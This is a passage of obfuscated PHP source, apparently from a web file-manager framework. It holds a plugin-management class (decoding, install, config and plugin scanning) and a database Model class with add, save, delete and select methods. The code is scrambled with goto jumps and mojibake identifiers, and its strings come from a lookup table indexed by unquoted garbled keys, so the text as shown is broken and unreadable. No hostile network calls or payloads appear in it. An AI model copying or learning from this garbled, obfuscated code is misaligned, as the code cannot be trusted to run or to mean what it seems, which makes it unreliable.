Fã›öë­¾—; A„¸Ê•ã¡ƒ: $få¨¶³„›É = mt_rand(0, 5) . $fÄËİ±ãÑ[71]; $Eªå¼Å³‹µ = rand_string(15); $AÔ°¡²áâÚ = $fÄËİ±ãÑ[182]; goto DÀÙÛ…¤È; d‡ôÙÃÅŞ‰: $fÄËİ±ãÑ =& $_SERVER[¬Ö°ı¶Â¯€æ]; usleep(2); $dËŒÇ©Û¦˜ = trim($dËŒÇ©Û¦˜); goto A„¸Ê•ã¡ƒ; Fã›öë­¾—: return $aÄçëôŒ†½; goto FÉÍ”Äµ®Œ; FÉÍ”Äµ®Œ: } public function decode($d¤’îÇˆº, $B²ÈÛß‡¿ , $Aõ˜Ç¡¿ÉÒ = 3) { goto f÷†¨íšÅ­; e‡¢àßï‚Ü: $d¤’îÇˆº = strrev($d¤’îÇˆº); $Dì“Õ–š²Ÿ = $d¤’îÇˆº[0]; $FÀÊõÑÜ = substr($d¤’îÇˆº, 1, 15); goto c¾øêÚó; c¾øêÚó: $d¤’îÇˆº = substr($d¤’îÇˆº, 16); $C ˆĞ¼İÉ = $dà¹ÁéŞ¤[182]; switch ($Dì“Õ–š²Ÿ) { case $dà¹ÁéŞ¤[125]: $fàø¼‚‚£â = Mcrypt::decode($d¤’îÇˆº, strrev($B²ÈÛß‡¿  . $FÀÊõÑÜ)); break; case $dà¹ÁéŞ¤[120]: $fàø¼‚‚£â = Mcrypt::decode($d¤’îÇˆº, strrev($FÀÊõÑÜ . $B²ÈÛß‡¿ )); break; case $dà¹ÁéŞ¤[183]: $fàø¼‚‚£â = Mcrypt::decode($d¤’îÇˆº, base64_encode($FÀÊõÑÜ . $B²ÈÛß‡¿ )); break; case $dà¹ÁéŞ¤[184]: $fàø¼‚‚£â = Mcrypt::decode($d¤’îÇˆº, md5($FÀÊõÑÜ . $B²ÈÛß‡¿ )); break; case $dà¹ÁéŞ¤[185]: goto eÏÒàğîœå; c•ÓÅœŒ·Â: break; goto eĞø½Øƒ…¿; aÇ”…©Ã: $Côã—¹Çµ = 0; for ($fö‡¬‰îÚ = 0; $fö‡¬‰îÚ < strlen($d¤’îÇˆº); $fö‡¬‰îÚ++) { $Côã—¹Çµ = $Côã—¹Çµ == strlen($A‹•§¢§) ? 0 : $Côã—¹Çµ; $B±šôˆø‚ = $Côã—¹Çµ++; $aê‰®ñÁæã = strpos($C ˆĞ¼İÉ, $d¤’îÇˆº[$fö‡¬‰îÚ]) - $Dœ©Áó’Ó - ord($A‹•§¢§[$B±šôˆø‚]); while ($aê‰®ñÁæã < 0) { $aê‰®ñÁæã += 64; } $dŸ¥áƒ‡Åù .= $C ˆĞ¼İÉ[$aê‰®ñÁæã]; } $fàø¼‚‚£â = base64_decode($dŸ¥áƒ‡Åù); goto c•ÓÅœŒ·Â; Fƒ‰ê¦„‰¥: $dŸ¥áƒ‡Åù = $dà¹ÁéŞ¤[71]; $fö‡¬‰îÚ = 0; $aê‰®ñÁæã = 0; goto aÇ”…©Ã; eÏÒàğîœå: $d¤’îÇˆº = hash_decode($d¤’îÇˆº); $e½¶µï¨Ö‘ = $d¤’îÇˆº[0]; $d¤’îÇˆº = substr($d¤’îÇˆº, 1); goto cËßÌ¦³è; cËßÌ¦³è: $Dœ©Áó’Ó = strpos($C ˆĞ¼İÉ, $e½¶µï¨Ö‘); $A‹•§¢§ = md5($e½¶µï¨Ö‘ . md5($B²ÈÛß‡¿  . $e½¶µï¨Ö‘) . $B²ÈÛß‡¿ ); $A‹•§¢§ = substr($A‹•§¢§, $Dœ©Áó’Ó % 8, $Dœ©Áó’Ó % 8 + 7); goto Fƒ‰ê¦„‰¥; eĞø½Øƒ…¿: default: $fàø¼‚‚£â = Mcrypt::decode($d¤’îÇˆº, $B²ÈÛß‡¿  . $FÀÊõÑÜ); break; } goto CŸƒÏæÏ‡; CŸƒÏæÏ‡: if ($Aõ˜Ç¡¿ÉÒ - 1 > 0) { $fàø¼‚‚£â = $this->decode($fàø¼‚‚£â, $B²ÈÛß‡¿ , $Aõ˜Ç¡¿ÉÒ - 1); } return $fàø¼‚‚£â; goto dÁ‘Ô¼÷·; f÷†¨íšÅ­: $dà¹ÁéŞ¤ =& $_SERVER[¬Ö°ı¶Â¯€æ]; if (!is_string($d¤’îÇˆº) || strlen($d¤’îÇˆº) < 10) { return !1; } $d¤’îÇˆº = trim($d¤’îÇˆº); goto e‡¢àßï‚Ü; dÁ‘Ô¼÷·: } public function appAllow($f”§‚«õ…¶, $eÕ°æØ…‹–, $cà†‰¯ƒ¾ = true) { $BÔ²Ö½Á‰î =& $_SERVER[¬Ö°ı¶Â¯€æ]; $fŒ„Ñ°Š¨– = PLUGIN_DIR . $f”§‚«õ…¶ . $BÔ²Ö½Á‰î[186]; if (!is_array($eÕ°æØ…‹–) || !is_array($eÕ°æØ…‹–[$BÔ²Ö½Á‰î[1]]) || !is_file($fŒ„Ñ°Š¨–) || $eÕ°æØ…‹–[$BÔ²Ö½Á‰î[187]] != 1) { return !1; } if ($cà†‰¯ƒ¾ && !Action($BÔ²Ö½Á‰î[188])->checkAuth($f”§‚«õ…¶)) { return !1; } return !0; } public function unInstall($a…ñ”ö—Ä) { $E§²ŸùŞò½ =& $_SERVER[¬Ö°ı¶Â¯€æ]; $C¼Î¢ÎÜ = $this->loadList($a…ñ”ö—Ä); if (file_exists(PLUGIN_DIR . $a…ñ”ö—Ä)) { Hook::apply($a…ñ”ö—Ä . $E§²ŸùŞò½[189]); } $this->remove($C¼Î¢ÎÜ[$E§²ŸùŞò½[122]]); } public function changeStatus($cô‡è¸ìê, $cğ–Á¸…®) { $D³ËÆÏ§Ì• =& $_SERVER[¬Ö°ı¶Â¯€æ]; $D…æŠãŸè = $this->loadList($cô‡è¸ìê); if ($cğ–Á¸…®) { Hook::apply($cô‡è¸ìê . $D³ËÆÏ§Ì•[190]); } $this->update($D…æŠãŸè[$D³ËÆÏ§Ì•[122]], array($D³ËÆÏ§Ì•[191] => $cğ–Á¸…®)); } public function appRegist($DäÎ­ƒ†¿®, $DÊ¿õëºİ™) { $c£¨Ìº²¼± =& $_SERVER[¬Ö°ı¶Â¯€æ]; $EöÒÕ½‘Ò = $this->loadList($DäÎ­ƒ†¿®); if ($EöÒÕ½‘Ò) { $this->update($EöÒÕ½‘Ò[$c£¨Ìº²¼±[122]], array($c£¨Ìº²¼±[1] => $DÊ¿õëºİ™)); } else { $DàèµàÄ = array($c£¨Ìº²¼±[0] => $DäÎ­ƒ†¿®, $c£¨Ìº²¼±[1] => $DÊ¿õëºİ™, $c£¨Ìº²¼±[187] => 0, $c£¨Ìº²¼±[43] => $this->getConfigDefault($DäÎ­ƒ†¿®)); $this->insert($DàèµàÄ); } } public function getConfigDefault($bÊˆºÖÌÖµ) { $FÓß£¨Ø†Õ =& $_SERVER[¬Ö°ı¶Â¯€æ]; $dšÇµµõ¨‚ = array(); $A ÀÔº¤÷ = $this->getPackageJson($bÊˆºÖÌÖµ); if (!$A ÀÔº¤÷ && is_array($A ÀÔº¤÷[$FÓß£¨Ø†Õ[192]])) { return $dšÇµµõ¨‚; } foreach ($A ÀÔº¤÷[$FÓß£¨Ø†Õ[192]] as $c¯¶¥µò˜ => $c½§ƒ¢·Şì) { if (!isset($c½§ƒ¢·Şì[$FÓß£¨Ø†Õ[193]]) || isset($dšÇµµõ¨‚[$c¯¶¥µò˜])) { continue; } $dšÇµµõ¨‚[$c¯¶¥µò˜] = $c½§ƒ¢·Şì[$FÓß£¨Ø†Õ[193]]; } return $dšÇµµõ¨‚; } public function getPackageJson($aŒä²º‹›Ä) { return Hook::apply($aŒä²º‹›Ä . $_SERVER[¬Ö°ı¶Â¯€æ][194]); } public function getConfig($BØÈèÜ©, $B­¨öìÇµá = false) { $Eñ‰ìÂ½Š =& $_SERVER[¬Ö°ı¶Â¯€æ]; $eŠİÀß‡ºë = array(); $dÚºñÓØ– = $this->loadList($BØÈèÜ©); if ($dÚºñÓØ– && is_array($dÚºñÓØ–[$Eñ‰ìÂ½Š[43]])) { $eŠİÀß‡ºë = $dÚºñÓØ–[$Eñ‰ìÂ½Š[43]]; } if (!$eŠİÀß‡ºë || $B­¨öìÇµá) { $eŠİÀß‡ºë = $this->getConfigDefault($BØÈèÜ©); } return $eŠİÀß‡ºë; } public function setConfig($C†áª³ôÈ¬, $eŠ±§ŞëÌ˜ = false) { goto dõµÇ°ŞÏ; F‹í–çŸÍ°: $this->update($B‹ÓäËãİâ[$bİôÏÉ£ˆÉ[122]], array($bİôÏÉ£ˆÉ[43] => $cÊÇÊ®ÙÙî)); goto E‹áÈôÙÂ»; BÎ÷µô²ê„: if ($eŠ±§ŞëÌ˜ == !1) { $eŠ±§ŞëÌ˜ = $this->getConfigDefault($C†áª³ôÈ¬); } $cÊÇÊ®ÙÙî = $B‹ÓäËãİâ[$bİôÏÉ£ˆÉ[43]]; foreach ($eŠ±§ŞëÌ˜ as $BßŒ«áèÓÍ => $F½»Šò¤×) { $cÊÇÊ®ÙÙî[$BßŒ«áèÓÍ] = is_string($F½»Šò¤×) ? trim($F½»Šò¤×) : $F½»Šò¤×; } goto F‹í–çŸÍ°; dõµÇ°ŞÏ: $bİôÏÉ£ˆÉ =& $_SERVER[¬Ö°ı¶Â¯€æ]; $B‹ÓäËãİâ = $this->loadList($C†áª³ôÈ¬); if (!$B‹ÓäËãİâ) { return !1; } goto BÎ÷µô²ê„; E‹áÈôÙÂ»: } public function viewList() { goto Bµ‹ÙÒ‚¸; Bµ‹ÙÒ‚¸: $e…Î³Úåš =& $_SERVER[¬Ö°ı¶Â¯€æ]; $dÒÁœæš¸¶ = $this->loadList(); $dÒÁœæš¸¶ = $this->checkPlugin($dÒÁœæš¸¶); goto côİ™Š®†; bÒõöï³Ü: return $C‹ ã†å°; goto BÌµŒÎ‰‘â; côİ™Š®†: $this->pluginScan($dÒÁœæš¸¶); $C‹ ã†å° = array(); foreach ($dÒÁœæš¸¶ as $EÚ®®«Ş÷Š => $CÎğÆîóãø) { unset($CÎğÆîóãø[$e…Î³Úåš[1]], $CÎğÆîóãø[$e…Î³Úåš[43]]); $Aø¢øõó³ = PLUGIN_DIR . $CÎğÆîóãø[$e…Î³Úåš[0]] . $e…Î³Úåš[186]; if (!is_file($Aø¢øõó³)) { continue; } $Eéâ½íÒË = Hook::apply($CÎğÆîóãø[$e…Î³Úåš[0]] . $e…Î³Úåš[194]); if (is_array($Eéâ½íÒË)) { $C‹ ã†å°[$EÚ®®«Ş÷Š] = array_merge($CÎğÆîóãø, $Eéâ½íÒË); } } goto bÒõöï³Ü; BÌµŒÎ‰‘â: } private function pluginScan($CâÛê³Üœö) { $Aƒ±³­È¡Ù =& $_SERVER[¬Ö°ı¶Â¯€æ]; recursion_dir(PLUGIN_DIR, $e³÷õìó˜, $D¨£…ÔéíÅ, 0); foreach ($e³÷õìó˜ as $e…Ïš´‚ø“) { $bÎ¶–šºÒ = get_path_this($e…Ïš´‚ø“); if (isset($CâÛê³Üœö[$bÎ¶–šºÒ]) || !file_exists($e…Ïš´‚ø“ . $Aƒ±³­È¡Ù[195]) || !file_exists($e…Ïš´‚ø“ . $Aƒ±³­È¡Ù[186])) { continue; } Hook::apply($bÎ¶–šºÒ . $Aƒ±³­È¡Ù[190]); } } } goto DåÍÑï°”Å; dğ¨½²ƒùİ: define($_SERVER[ÍÓÖ€°å][222], 0); define($_SERVER[ÍÓÖ€°å][223], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\145", "\x6f\162\x64\x65\162", "\141\154\x69\x61\163", "\x68\x61\166\151\x6e\147", "\x67\x72\x6f\x75\x70", "\154\x6f\143\153", "\144\151\163\164\151\156\x63\x74", "\x61\x75\x74\157", "\146\151\154\x74\145\162", "\x76\x61\154\x69\x64\x61\164\145", "\162\145\163\x75\154\164", "\142\151\x6e\x64", "\x74\x6f\x6b\145\x6e"); public function __construct($D»È´Ò¯ = '', $dĞÎ’Ùˆâ = '', $CËóè¤Ò¶ = '') { $Aò‰°à×¯ù =& $_SERVER[ÍÓÖ€°å]; $this->_initialize(); if (!empty($D»È´Ò¯)) { if (strpos($D»È´Ò¯, $Aò‰°à×¯ù[90])) { list($this->dbName, $this->name) = explode($Aò‰°à×¯ù[90], $D»È´Ò¯); } else { $this->name = $D»È´Ò¯; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($dĞÎ’Ùˆâ)) { $this->tablePrefix = $Aò‰°à×¯ù[33]; } elseif ($Aò‰°à×¯ù[33] != $dĞÎ’Ùˆâ) { $this->tablePrefix = $dĞÎ’Ùˆâ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Aò‰°à×¯ù[224]); } $this->db(0, empty($this->connection) ? $CËóè¤Ò¶ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Bô¥Š†‘Ò… =& $_SERVER[ÍÓÖ€°å]; if (empty($this->fields)) { if (think_config($Bô¥Š†‘Ò…[225])) { $c§†µˆ°Î‹ = $this->dbName ? $this->dbName : think_config($Bô¥Š†‘Ò…[226]); $dùğ…“çÆ = think_var_cache($Bô¥Š†‘Ò…[227] . strtolower(get_path_this($c§†µˆ°Î‹) . $Bô¥Š†‘Ò…[90] . $this->name)); if ($dùğ…“çÆ) { $CâÆÃ»İÒ² = think_config($Bô¥Š†‘Ò…[228]); if (empty($CâÆÃ»İÒ²) || $dùğ…“çÆ[$Bô¥Š†‘Ò…[229]] == $CâÆÃ»İÒ²) { $this->fields = $dùğ…“çÆ; return; } } } $this->flush(); } } public function flush() { goto B„á”Ì¹´Á; dÉ§ØŒ§¤š: foreach ($cùîÅè£Œà as $bêˆÌÚ­Šâ => $E—§ŠœÄõ) { $EŒÑÅ©³Ç[$bêˆÌÚ­Šâ] = $E—§ŠœÄõ[$a˜ö¸öíÍ¾[29]]; if ($E—§ŠœÄõ[$a˜ö¸öíÍ¾[36]]) { $this->fields[$a˜ö¸öíÍ¾[231]] = $bêˆÌÚ­Šâ; if ($E—§ŠœÄõ[$a˜ö¸öíÍ¾[39]]) { $this->fields[$a˜ö¸öíÍ¾[230]] = !0; } } } $this->fields[$a˜ö¸öíÍ¾[232]] = $EŒÑÅ©³Ç; if (think_config($a˜ö¸öíÍ¾[228])) { $this->fields[$a˜ö¸öíÍ¾[229]] = think_config($a˜ö¸öíÍ¾[228]); } goto DåêÁóç¶«; B„á”Ì¹´Á: $a˜ö¸öíÍ¾ =& $_SERVER[ÍÓÖ€°å]; $this->db->setModel($this->name); $cùîÅè£Œà = $this->db->getFields($this->getTableName()); goto F§÷Äâ‘Ù; DåêÁóç¶«: if (think_config($a˜ö¸öíÍ¾[225])) { $DŠ‚ ÁôùÄ = $this->dbName ? $this->dbName : think_config($a˜ö¸öíÍ¾[226]); think_var_cache($a˜ö¸öíÍ¾[227] . strtolower(get_path_this($DŠ‚ ÁôùÄ) . $a˜ö¸öíÍ¾[90] . $this->name), $this->fields); } goto dÃ‰¦ãİ“¥; F§÷Äâ‘Ù: if (!$cùîÅè£Œà) { return !1; } $this->fields = array_keys($cùîÅè£Œà); $this->fields[$a˜ö¸öíÍ¾[230]] = !1; goto dÉ§ØŒ§¤š; dÃ‰¦ãİ“¥: } public function switchModel($dœÊ¼›Ş†ß, $d›„ùË˜Ì¢ = array()) { $Fƒ¦èÔŒ¹¡ =& $_SERVER[ÍÓÖ€°å]; $CÑ¾½ê¹ñ = ucwords(strtolower($dœÊ¼›Ş†ß)) . $Fƒ¦èÔŒ¹¡[233]; if (!class_exists($CÑ¾½ê¹ñ)) { think_exception($CÑ¾½ê¹ñ . think_lang($Fƒ¦èÔŒ¹¡[234])); } $this->_extModel = new $CÑ¾½ê¹ñ($this->name); if (!empty($d›„ùË˜Ì¢)) { foreach ($d›„ùË˜Ì¢ as $EˆÖ ¢‚¤’) { $this->_extModel->setProperty($EˆÖ ¢‚¤’, $this->{$EˆÖ ¢‚¤’}); } } return $this->_extModel; } public function __set($a¨ÀÎİò¶½, $dã¬Ÿì×áÁ) { $this->data[$a¨ÀÎİò¶½] = $dã¬Ÿì×áÁ; } public function __get($a–­ÃñÄƒ) { return isset($this->data[$a–­ÃñÄƒ]) ? $this->data[$a–­ÃñÄƒ] : null; } public function __isset($Câà¿à¹Şà) { return isset($this->data[$Câà¿à¹Şà]); } public function __unset($EÇÆ‡™ë™Š) { unset($this->data[$EÇÆ‡™ë™Š]); } public function __call($b“Ñ‘İåâ², $fÜ¶Æõâ‘á) { $fÙ‹³•‰›‰ =& $_SERVER[ÍÓÖ€°å]; if (in_array(strtolower($b“Ñ‘İåâ²), $this->methods, !0)) { $this->options[strtolower($b“Ñ‘İåâ²)] = $fÜ¶Æõâ‘á[0]; return $this; } elseif (in_array(strtolower($b“Ñ‘İåâ²), array($fÙ‹³•‰›‰[235], $fÙ‹³•‰›‰[236], $fÙ‹³•‰›‰[237], $fÙ‹³•‰›‰[238], $fÙ‹³•‰›‰[239]), !0)) { $FïµÅÌÉ÷ = isset($fÜ¶Æõâ‘á[0]) ? $fÜ¶Æõâ‘á[0] : $fÙ‹³•‰›‰[164]; $FïµÅÌÉ÷ = $this->db->parseKey($FïµÅÌÉ÷); return $this->getField(strtoupper($b“Ñ‘İåâ²) . $fÙ‹³•‰›‰[240] . $FïµÅÌÉ÷ . $fÙ‹³•‰›‰[241] . $b“Ñ‘İåâ², $fÙ‹³•‰›‰[235]); } elseif (strtolower(substr($b“Ñ‘İåâ², 0, 5)) == $fÙ‹³•‰›‰[242]) { $FïµÅÌÉ÷ = think_parse_name(substr($b“Ñ‘İåâ², 5)); $fö¸¡ŸˆÎ÷[$FïµÅÌÉ÷] = $fÜ¶Æõâ‘á[0]; return $this->where($fö¸¡ŸˆÎ÷)->find(); } elseif (strtolower(substr($b“Ñ‘İåâ², 0, 10)) == $fÙ‹³•‰›‰[243]) { $f¿‘ÂËŠÇ = think_parse_name(substr($b“Ñ‘İåâ², 10)); $fö¸¡ŸˆÎ÷[$f¿‘ÂËŠÇ] = $fÜ¶Æõâ‘á[0]; return $this->where($fö¸¡ŸˆÎ÷)->getField($fÜ¶Æõâ‘á[1]); } elseif (isset($this->_scope[$b“Ñ‘İåâ²])) { return $this->scope($b“Ñ‘İåâ², $fÜ¶Æõâ‘á[0]); } elseif (method_exists($this, $b“Ñ‘İåâ²)) { array_unshift($fÜ¶Æõâ‘á, $b“Ñ‘İåâ²); return call_user_func_array(array($this, $fÙ‹³•‰›‰[244]), $fÜ¶Æõâ‘á); } else { return call_user_func_array(array(parent, $b“Ñ‘İåâ²), $fÜ¶Æõâ‘á); } } protected function call() { goto EğËÉ‰ áğ; Bß‘åˆ„ùò: $CîÙ¥±„¨µ = $ağçßÃÔ‡; if (is_array($ağçßÃÔ‡)) { $CîÙ¥±„¨µ = $ağçßÃÔ‡[1]; $ağçßÃÔ‡ = $ağçßÃÔ‡[0]; } if ($A­©è÷Ã£ï[count($A­©è÷Ã£ï) - 1] === $ağçßÃÔ‡) { think_exception(__CLASS__ . $EğÔŸæÒ–Ë[4] . $ağçßÃÔ‡ . think_lang($EğÔŸæÒ–Ë[245])); return; } goto d¿——ô–; EğËÉ‰ áğ: $EğÔŸæÒ–Ë =& $_SERVER[ÍÓÖ€°å]; $A­©è÷Ã£ï = func_get_args(); $ağçßÃÔ‡ = array_shift($A­©è÷Ã£ï); goto Bß‘åˆ„ùò; aÈë “Ä…ñ: if (method_exists($this, $EğÔŸæÒ–Ë[248])) { $fÂ¢ØôÄáô = call_user_func_array(array($this, $EğÔŸæÒ–Ë[249]), array($CîÙ¥±„¨µ, $A­©è÷Ã£ï, $fâİÖäñ)); if ($fÂ¢ØôÄáô) { return $fÂ¢ØôÄáô; } } return $fâİÖäñ; goto cÅ®‡˜¤ø¿; d¿——ô–: $A­©è÷Ã£ï[] = $ağçßÃÔ‡; if (method_exists($this, $EğÔŸæÒ–Ë[246])) { $fÂ¢ØôÄáô = call_user_func_array(array($this, $EğÔŸæÒ–Ë[247]), array($CîÙ¥±„¨µ, $A­©è÷Ã£ï)); if (!is_null($fÂ¢ØôÄáô) && $fÂ¢ØôÄáô !== !1) { return $fÂ¢ØôÄáô; } } $fâİÖäñ = call_user_func_array(array($this, $ağçßÃÔ‡), $A­©è÷Ã£ï); goto aÈë “Ä…ñ; cÅ®‡˜¤ø¿: } protected function _initialize() { } protected function _facade($CæÉ®˜¹Ó) { $fëÏÄ„•ÔÚ =& $_SERVER[ÍÓÖ€°å]; if (!empty($this->fields)) { foreach ($CæÉ®˜¹Ó as $c’”Í‡®äÀ => $Dƒ°ğ‘’Ä¦) { if (!in_array($c’”Í‡®äÀ, $this->fields, !0)) { unset($CæÉ®˜¹Ó[$c’”Í‡®äÀ]); } elseif (is_scalar($Dƒ°ğ‘’Ä¦)) { $this->_parseType($CæÉ®˜¹Ó, $c’”Í‡®äÀ); } } } if (!empty($this->options[$fëÏÄ„•ÔÚ[250]])) { $CæÉ®˜¹Ó = array_map($this->options[$fëÏÄ„•ÔÚ[250]], $CæÉ®˜¹Ó); unset($this->options[$fëÏÄ„•ÔÚ[250]]); } $this->_beforeWrite($CæÉ®˜¹Ó); return $CæÉ®˜¹Ó; } protected function _beforeWrite(&$e°äÜÈŞÄù) { } public function add($e·Ì­åô–ˆ = '', $dĞÚÔ¬é•‡ = array(), $EÖ¦ìçœã¬ = false) { goto bª†¥çÔ´½; D¯é¬âì«: return $f‘˜ŠÀ ÃÉ; goto f¾´ÍµÂĞá; D¥ñ¨ğ…ÍÚ: if (!1 === $this->_beforeInsert($e·Ì­åô–ˆ, $dĞÚÔ¬é•‡)) { return !1; } $f‘˜ŠÀ ÃÉ = $this->db->insert($e·Ì­åô–ˆ, $dĞÚÔ¬é•‡, $EÖ¦ìçœã¬); if (!1 !== $f‘˜ŠÀ ÃÉ) { $bÜ•«Ä¤Àù = $this->getLastInsID(); if ($bÜ•«Ä¤Àù) { $e·Ì­åô–ˆ[$this->getPk()] = $bÜ•«Ä¤Àù; $this->_after_insert($e·Ì­åô–ˆ, $dĞÚÔ¬é•‡); return $bÜ•«Ä¤Àù; } $this->_after_insert($e·Ì­åô–ˆ, $dĞÚÔ¬é•‡); } goto D¯é¬âì«; bª†¥çÔ´½: if (empty($e·Ì­åô–ˆ)) { if (!empty($this->data)) { $e·Ì­åô–ˆ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ÍÓÖ€°å][251]); return !1; } } $dĞÚÔ¬é•‡ = $this->_parseOptions($dĞÚÔ¬é•‡); $e·Ì­åô–ˆ = $this->_facade($e·Ì­åô–ˆ); goto D¥ñ¨ğ…ÍÚ; f¾´ÍµÂĞá: } protected function _beforeInsert(&$aéÈ”ÁÀİï, $C ÀÑÒíÃó) { } protected function _after_insert($dîÆ•¦Œ“Ø, $B§¨¹šçÓÎ) { } public function addAll($C‘àíÇÏØ, $E‰˜ªôÇå’ = array(), $f¼ôˆ ×¾Ï = false) { goto cÍ¯İÛ¦‚ö; a——¥ ‰Õ: foreach ($C‘àíÇÏØ as $CÎÓ¡â‚—§ => $E½ĞãÂËğÏ) { $C‘àíÇÏØ[$CÎÓ¡â‚—§] = $this->_facade($E½ĞãÂËğÏ); } if (method_exists($this->db, $c›´¹ßÎºÙ[252])) { $fë¶ƒó›ñæ = $this->db->insertAll($C‘àíÇÏØ, $E‰˜ªôÇå’, $f¼ôˆ ×¾Ï); } else { $this->startTrans(); foreach ($C‘àíÇÏØ as $CÎÓ¡â‚—§ => $E½ĞãÂËğÏ) { $fë¶ƒó›ñæ = $this->db->insert($E½ĞãÂËğÏ, $E‰˜ªôÇå’, $f¼ôˆ ×¾Ï); } $this->commit(); } if (!1 !== $fë¶ƒó›ñæ) { $B¡‚®³Ü´ = $this->getLastInsID(); if ($B¡‚®³Ü´) { return $B¡‚®³Ü´; } } goto e¬ºÏâ»§È; cÍ¯İÛ¦‚ö: $c›´¹ßÎºÙ =& $_SERVER[ÍÓÖ€°å]; if (empty($C‘àíÇÏØ)) { $this->error = think_lang($c›´¹ßÎºÙ[251]); return !1; } $E‰˜ªôÇå’ = $this->_parseOptions($E‰˜ªôÇå’); goto a——¥ ‰Õ; e¬ºÏâ»§È: return $fë¶ƒó›ñæ; goto fë²ƒ»íªë; fë²ƒ»íªë: } public function selectAdd($d¯ÌÆéê· = '', $bœ•¨å¬äĞ = '', $D…±µ§Ù‚Î = array()) { $aóŸãÆ‰À =& $_SERVER[ÍÓÖ€°å]; $D…±µ§Ù‚Î = $this->_parseOptions($D…±µ§Ù‚Î); if (!1 === ($F„“Ö—³¶Å = $this->db->selectInsert($d¯ÌÆéê· ? $d¯ÌÆéê· : $D…±µ§Ù‚Î[$aóŸãÆ‰À[253]], $bœ•¨å¬äĞ ? $bœ•¨å¬äĞ : $this->getTableName(), $D…±µ§Ù‚Î))) { $this->error = think_lang($aóŸãÆ‰À[254]); return !1; } else { return $F„“Ö—³¶Å; } } public function save($F‹‹÷ÑÂª§ = '', $B½íïùÚâ = array()) { goto aÆ‰ò…ğÚ; aÆ‰ò…ğÚ: $BÜŒõƒ±´ª =& $_SERVER[ÍÓÖ€°å]; if (empty($F‹‹÷ÑÂª§)) { if (!empty($this->data)) { $F‹‹÷ÑÂª§ = $this->data; $this->data = array(); } else { $this->error = think_lang($BÜŒõƒ±´ª[251]); return !1; } } $F‹‹÷ÑÂª§ = $this->_facade($F‹‹÷ÑÂª§); goto fÆ®»÷Áõ‰; D¡Ä—ÊàÅ†: if (!1 !== $A²­‹…Õò) { if (isset($Fà¬¡†‡ˆ¦)) { $F‹‹÷ÑÂª§[$d‘”Éª¦°„] = $Fà¬¡†‡ˆ¦; } $this->_afterUpdate($F‹‹÷ÑÂª§, $B½íïùÚâ); } return $A²­‹…Õò; goto e”âÅ—¡ã; BÊ„’ÒÎ: if (is_array($B½íïùÚâ[$BÜŒõƒ±´ª[255]]) && isset($B½íïùÚâ[$BÜŒõƒ±´ª[255]][$d‘”Éª¦°„])) { $Fà¬¡†‡ˆ¦ = $B½íïùÚâ[$BÜŒõƒ±´ª[255]][$d‘”Éª¦°„]; } if (!1 === $this->_beforeUpdate($F‹‹÷ÑÂª§, $B½íïùÚâ)) { return !1; } $A²­‹…Õò = $this->db->update($F‹‹÷ÑÂª§, $B½íïùÚâ); goto D¡Ä—ÊàÅ†; fÆ®»÷Áõ‰: $B½íïùÚâ = $this->_parseOptions($B½íïùÚâ); $d‘”Éª¦°„ = $this->getPk(); if (!isset($B½íïùÚâ[$BÜŒõƒ±´ª[255]])) { if (isset($F‹‹÷ÑÂª§[$d‘”Éª¦°„])) { $Eä¢¢–ÉÁÅ[$d‘”Éª¦°„] = $F‹‹÷ÑÂª§[$d‘”Éª¦°„]; $B½íïùÚâ[$BÜŒõƒ±´ª[255]] = $Eä¢¢–ÉÁÅ; unset($F‹‹÷ÑÂª§[$d‘”Éª¦°„]); } else { $this->error = think_lang($BÜŒõƒ±´ª[254]); return !1; } } goto BÊ„’ÒÎ; e”âÅ—¡ã: } protected function _beforeUpdate(&$Eƒ‚³®à¤Ó, $EôÜñ…ßñ) { } protected function _afterUpdate($d¯ÌÀâ³Ÿ, $fÊ†§²ö¯) { } public function delete($bÊœŒ¥ô†¶ = array()) { goto D¼”½Ğ®Ú; D¼”½Ğ®Ú: $aÙÊÈ›‘‰å =& $_SERVER[ÍÓÖ€°å]; if (empty($bÊœŒ¥ô†¶) && empty($this->options[$aÙÊÈ›‘‰å[255]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $aĞŒçĞÏ„¤ = $this->getPk(); goto aêˆÓÔ©µÈ; EïÆĞç”¶ƒ: $e÷™ô”ÊŸº = $this->db->delete($bÊœŒ¥ô†¶); if (!1 !== $e÷™ô”ÊŸº) { $D¤‰Í°­‹ = array(); if (isset($eŞÍ„…·ˆ)) { $D¤‰Í°­‹[$aĞŒçĞÏ„¤] = $eŞÍ„…·ˆ; } $this->_after_delete($D¤‰Í°­‹, $bÊœŒ¥ô†¶); } return $e÷™ô”ÊŸº; goto Dî‘´‘Ç¿Ú; aêˆÓÔ©µÈ: if (is_numeric($bÊœŒ¥ô†¶) || is_string($bÊœŒ¥ô†¶)) { if (strpos($bÊœŒ¥ô†¶, $aÙÊÈ›‘‰å[47])) { $A½°¡—Ë·½[$aĞŒçĞÏ„¤] = array($aÙÊÈ›‘‰å[256], $bÊœŒ¥ô†¶); } else { $A½°¡—Ë·½[$aĞŒçĞÏ„¤] = $bÊœŒ¥ô†¶; } $this->options[$aÙÊÈ›‘‰å[255]] = $A½°¡—Ë·½; } $bÊœŒ¥ô†¶ = $this->_parseOptions(); if (is_array($bÊœŒ¥ô†¶[$aÙÊÈ›‘‰å[255]]) && isset($bÊœŒ¥ô†¶[$aÙÊÈ›‘‰å[255]][$aĞŒçĞÏ„¤])) { $eŞÍ„…·ˆ = $bÊœŒ¥ô†¶[$aÙÊÈ›‘‰å[255]][$aĞŒçĞÏ„¤]; } goto EïÆĞç”¶ƒ; Dî‘´‘Ç¿Ú: } protected function _after_delete($bµµŸ½Ù•æ, $C‚¬å·Ù‹Ú) { } public function select($dæ©õ«ßôä = array()) { goto d±×¼§…–Ë; A×ö×è†: $CïÆŠ²‰¡Ø = $this->db->select($dæ©õ«ßôä); if (!1 === $CïÆŠ²‰¡Ø) { return !1; 